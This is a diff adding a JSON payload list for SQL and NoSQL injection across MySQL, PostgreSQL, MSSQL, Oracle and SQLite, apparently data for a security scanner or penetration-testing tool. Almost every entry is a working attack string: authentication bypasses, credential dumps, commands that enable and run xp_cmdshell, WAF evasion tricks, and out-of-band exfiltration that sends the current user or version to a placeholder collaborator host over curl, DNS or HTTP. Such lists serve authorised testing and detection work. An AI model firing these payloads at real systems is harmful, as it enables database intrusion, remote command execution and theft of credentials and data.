@@ -1,0 +1,151 @@
+{
+  "category": "sqli",
+  "contexts": {
+    "mysql": {
+      "description": "MySQL-specific SQL injection payloads",
+      "payloads": [
+        {"payload": "' OR '1'='1", "description": "Classic OR bypass single quote", "waf_bypass": false},
+        {"payload": "' OR 1=1--", "description": "OR bypass with comment terminator", "waf_bypass": false},
+        {"payload": "' OR 1=1#", "description": "OR bypass with hash comment", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,NULL,NULL--", "description": "UNION SELECT column count probe", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,@@version,NULL--", "description": "UNION SELECT version extraction", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--", "description": "UNION SELECT table enumeration", "waf_bypass": false},
+        {"payload": "1' AND ExtractValue(1,CONCAT(0x7e,version()))--", "description": "Error-based ExtractValue", "waf_bypass": false},
+        {"payload": "1' AND UpdateXML(1,CONCAT(0x7e,version()),1)--", "description": "Error-based UpdateXML", "waf_bypass": false},
+        {"payload": "1' AND SLEEP(5)--", "description": "Time-based SLEEP", "waf_bypass": false},
+        {"payload": "1' AND IF(1=1,SLEEP(5),0)--", "description": "Conditional SLEEP", "waf_bypass": false},
+        {"payload": "1' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--", "description": "Version blind extraction via SLEEP", "waf_bypass": false},
+        {"payload": "/*!50000 UNION*/ /*!50000 SELECT*/ NULL,NULL,NULL--", "description": "Version comment bypass", "waf_bypass": true},
+        {"payload": "1' /*!UNION*/ /*!SELECT*/ NULL,NULL--", "description": "Comment-wrapped keywords bypass", "waf_bypass": true},
+        {"payload": "1'/**/UNION/**/SELECT/**/NULL,NULL--", "description": "Comment-separated keywords", "waf_bypass": true}
+      ]
+    },
+    "postgresql": {
+      "description": "PostgreSQL-specific SQL injection payloads",
+      "payloads": [
+        {"payload": "' OR '1'='1", "description": "Classic OR bypass", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,NULL,NULL--", "description": "UNION SELECT probe", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,version(),NULL--", "description": "UNION version extraction", "waf_bypass": false},
+        {"payload": "1'; SELECT pg_sleep(5)--", "description": "Stacked query with pg_sleep", "waf_bypass": false},
+        {"payload": "1' AND 1=CAST((SELECT version()) AS int)--", "description": "CAST error-based extraction", "waf_bypass": false},
+        {"payload": "1'; COPY (SELECT '') TO PROGRAM 'curl http://COLLABORATOR_URL/$(whoami)'--", "description": "COPY TO PROGRAM RCE (superuser required) — exfil via Collaborator", "waf_bypass": false},
+        {"payload": "1' AND 1=(SELECT 1 FROM pg_sleep(5))--", "description": "Subquery pg_sleep", "waf_bypass": false},
+        {"payload": "1'; SELECT $1$alert$1$--", "description": "Dollar-quote injection probe", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,current_database(),NULL--", "description": "Current database name", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,usename,passwd FROM pg_shadow--", "description": "pg_shadow credential dump (superuser)", "waf_bypass": false}
+      ]
+    },
+    "mssql": {
+      "description": "Microsoft SQL Server injection payloads",
+      "payloads": [
+        {"payload": "' OR '1'='1", "description": "Classic OR bypass", "waf_bypass": false},
+        {"payload": "1'; WAITFOR DELAY '0:0:5'--", "description": "Time-based WAITFOR DELAY", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,NULL,NULL--", "description": "UNION SELECT probe", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,@@version,NULL--", "description": "UNION version extraction", "waf_bypass": false},
+        {"payload": "1'; EXEC xp_cmdshell('whoami')--", "description": "xp_cmdshell command execution (if enabled)", "waf_bypass": false},
+        {"payload": "1' AND 1=CONVERT(int,@@version)--", "description": "CONVERT error-based version extraction", "waf_bypass": false},
+        {"payload": "1' UNION SELECT NULL,name,NULL FROM sys.databases--", "description": "Database enumeration via sys.databases", "waf_bypass": false},
+        {"payload": "1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--", "description": "Enable xp_cmdshell via sp_configure", "waf_bypass": false}
+      ]
+    },
+    "blind_time": {
+      "description": "Time-based blind SQL injection payloads (all databases)",
+      "payloads": [
+        {"payload": "1' AND SLEEP(5)--", "description": "MySQL SLEEP time-based blind", "waf_bypass": false},
+        {"payload": "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", "description": "MySQL subquery SLEEP", "waf_bypass": false},
+        {"payload": "1' AND 1=1 AND SLEEP(5)--", "description": "Conditional MySQL SLEEP", "waf_bypass": false},
+        {"payload": "1'; SELECT pg_sleep(5)--", "description": "PostgreSQL stacked pg_sleep", "waf_bypass": false},
+        {"payload": "1' AND 1=(SELECT 1 FROM pg_sleep(5))--", "description": "PostgreSQL subquery pg_sleep", "waf_bypass": false},
+        {"payload": "1'; WAITFOR DELAY '0:0:5'--", "description": "MSSQL WAITFOR DELAY", "waf_bypass": false},
+        {"payload": "1' AND 1=BENCHMARK(5000000,MD5(1))--", "description": "MySQL BENCHMARK CPU-based delay", "waf_bypass": false},
+        {"payload": "1' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP(5)=1)--", "description": "Oracle DBMS_LOCK.SLEEP", "waf_bypass": false}
+      ]
+    },
+    "blind_boolean": {
+      "description": "Boolean-based blind SQL injection payloads",
+      "payloads": [
+        {"payload": "1' AND 1=1--", "description": "True condition", "waf_bypass": false},
+        {"payload": "1' AND 1=2--", "description": "False condition", "waf_bypass": false},
+        {"payload": "1' AND SUBSTRING(version(),1,1)='5'--", "description": "Version first char extraction", "waf_bypass": false},
+        {"payload": "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "description": "Table count boolean check", "waf_bypass": false},
+        {"payload": "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>90--", "description": "Binary search on DB name first char", "waf_bypass": false},
+        {"payload": "1' AND (SELECT COUNT(*) FROM users)>0--", "description": "Confirm users table exists", "waf_bypass": false},
+        {"payload": "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--", "description": "Admin password first char blind", "waf_bypass": false},
+        {"payload": "1' AND ORD(MID(version(),1,1))>50--", "description": "ORD/MID binary search", "waf_bypass": false}
+      ]
+    },
+    "nosql": {
+      "description": "NoSQL injection payloads targeting MongoDB and similar",
+      "payloads": [
+        {"payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "description": "MongoDB $gt operator auth bypass", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "description": "MongoDB $ne null auth bypass", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}", "description": "MongoDB $regex wildcard bypass", "waf_bypass": false},
+        {"payload": "'; return true; var a='", "description": "MongoDB $where JavaScript injection", "waf_bypass": false},
+        {"payload": "' || 'a'=='a", "description": "NoSQL string concat bypass", "waf_bypass": false},
+        {"payload": "admin' || 'a'=='a", "description": "NoSQL OR auth bypass", "waf_bypass": false},
+        {"payload": "{\"$where\": \"this.username == this.password\"}", "description": "MongoDB $where field comparison", "waf_bypass": false},
+        {"payload": "username=admin&password[$ne]=wrongpassword", "description": "HTTP parameter $ne operator injection", "waf_bypass": false},
+        {"payload": "username[$regex]=a.*&password[$ne]=x", "description": "HTTP parameter $regex injection", "waf_bypass": false}
+      ]
+    },
+    "oracle": {
+      "description": "Oracle database-specific SQL injection payloads",
+      "payloads": [
+        {"payload": "' OR 1=1--", "description": "Classic OR bypass", "waf_bypass": false},
+        {"payload": "' UNION SELECT NULL,NULL,NULL FROM DUAL--", "description": "UNION SELECT probe using DUAL table", "waf_bypass": false},
+        {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "description": "Time-based blind via DBMS_PIPE.RECEIVE_MESSAGE", "waf_bypass": false},
+        {"payload": "' || (SELECT banner FROM v$version WHERE ROWNUM=1) || '", "description": "String concat version extraction via v$version", "waf_bypass": false},
+        {"payload": "' UNION SELECT username,password,NULL FROM all_users--", "description": "UNION SELECT user enumeration from all_users", "waf_bypass": false},
+        {"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.COLLABORATOR_URL')='x", "description": "Out-of-band DNS exfiltration via UTL_INADDR — appends current_user to Collaborator subdomain", "waf_bypass": false}
+      ]
+    },
+    "sqlite": {
+      "description": "SQLite-specific SQL injection payloads",
+      "payloads": [
+        {"payload": "' OR 1=1--", "description": "Classic OR bypass", "waf_bypass": false},
+        {"payload": "' UNION SELECT sql FROM sqlite_master--", "description": "UNION SELECT schema extraction from sqlite_master", "waf_bypass": false},
+        {"payload": "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "description": "Time-based blind via heavy computation", "waf_bypass": false},
+        {"payload": "' UNION SELECT name FROM sqlite_master WHERE type='table'--", "description": "UNION SELECT table name enumeration", "waf_bypass": false},
+        {"payload": "' UNION SELECT tbl_name FROM sqlite_master--", "description": "UNION SELECT table names via tbl_name column", "waf_bypass": false}
+      ]
+    },
+    "second_order": {
+      "description": "Stored/second-order SQL injection payloads that execute when data is retrieved and used in a later query",
+      "payloads": [
+        {"payload": "admin'--", "description": "Username with comment to bypass password check on re-use", "waf_bypass": false},
+        {"payload": "' OR '1'='1", "description": "Classic OR bypass stored for later query injection", "waf_bypass": false},
+        {"payload": "test' UNION SELECT 1--", "description": "UNION SELECT stored for second-order execution", "waf_bypass": false},
+        {"payload": "admin'/*", "description": "Username with block comment for stored injection", "waf_bypass": false},
+        {"payload": "admin' AND 1=1--", "description": "Username registration with boolean SQLi — triggers on profile display or admin dashboard query", "waf_bypass": false},
+        {"payload": "test'); SELECT version();--", "description": "Stacked second-order probe — executes when value is used in unparameterized INSERT/UPDATE; reveals version on error/log", "waf_bypass": false},
+        {"payload": "user@evil.com' UNION SELECT password FROM users WHERE '1'='1", "description": "Email field stored injection — triggers when email is used in later notification or export query", "waf_bypass": false}
+      ]
+    },
+    "waf_bypass": {
+      "description": "SQL injection WAF evasion payloads using encoding, comments, and obfuscation techniques",
+      "payloads": [
+        {"payload": "/*!50000SELECT*/ /*!50000NULL*/,/*!50000NULL*/--", "description": "MySQL version comments — executes only on MySQL >= 5.0, invisible to many WAFs", "waf_bypass": true},
+        {"payload": "1' UniOn SeLeCt NULL,NULL--", "description": "Mixed case keywords — bypasses case-sensitive WAF rules", "waf_bypass": true},
+        {"payload": "1'\t\tUNION\t\tSELECT\t\tNULL--", "description": "Tab whitespace substitution — replaces spaces with tabs to evade space-based pattern matching", "waf_bypass": true},
+        {"payload": "1'%0aUNION%0aSELECT%0aNULL--", "description": "Newline whitespace substitution — URL-encoded newlines between keywords", "waf_bypass": true},
+        {"payload": "1' UN%49ON SEL%45CT NULL--", "description": "URL-encoded characters within keywords — some WAFs decode before matching, some don't", "waf_bypass": true},
+        {"payload": "1' UNION SELECT 1e0FROM users--", "description": "Scientific notation as separator — 1e0FROM is parsed as number then keyword by SQL engine", "waf_bypass": true},
+        {"payload": "1' AND 'ad'||'min'=(SELECT username FROM users LIMIT 1)--", "description": "String concatenation — splits blocked keywords like 'admin' across concat operators", "waf_bypass": true},
+        {"payload": "1' AND username=CHAR(97,100,109,105,110)--", "description": "CHAR() function — constructs strings from ASCII codes to avoid keyword detection", "waf_bypass": true},
+        {"payload": "1'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL--", "description": "Inline comments between every keyword — maximally fragmented query", "waf_bypass": true},
+        {"payload": "1' /*!UNION*/ /*!SELECT*/ NULL,NULL /*!FROM*/ /*!information_schema.tables*/--", "description": "MySQL conditional comments wrapping each keyword — invisible to non-MySQL WAF parsers", "waf_bypass": true}
+      ]
+    },
+    "oob_exfil": {
+      "description": "Out-of-band data exfiltration payloads using DNS or HTTP callbacks per database engine",
+      "payloads": [
+        {"payload": "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.COLLABORATOR_URL\\\\a'))--", "description": "MySQL LOAD_FILE UNC path — exfils version() via DNS lookup to attacker domain (Windows only)", "waf_bypass": false},
+        {"payload": "1'; EXEC master..xp_dirtree '\\\\COLLABORATOR_URL\\a'--", "description": "MSSQL xp_dirtree — triggers DNS lookup to attacker-controlled domain for blind confirmation", "waf_bypass": false},
+        {"payload": "1' AND 1=UTL_HTTP.REQUEST('http://COLLABORATOR_URL/'||(SELECT user FROM dual))--", "description": "Oracle UTL_HTTP.REQUEST — HTTP callback exfiltrating current user (requires ACL permission)", "waf_bypass": false},
+        {"payload": "1'; SELECT dblink_send_query('host=COLLABORATOR_URL dbname=x','SELECT version()')--", "description": "PostgreSQL dblink — sends query result via outbound connection to attacker host", "waf_bypass": false},
+        {"payload": "1'; EXEC master..xp_subdirs '\\\\COLLABORATOR_URL\\a'--", "description": "MSSQL xp_subdirs — alternative to xp_dirtree for DNS exfiltration", "waf_bypass": false},
+        {"payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.COLLABORATOR_URL\\\\')))))--", "description": "MySQL combined error-based + OOB — error reveals data while DNS confirms execution", "waf_bypass": false}
+      ]
+    }
+  }
+}
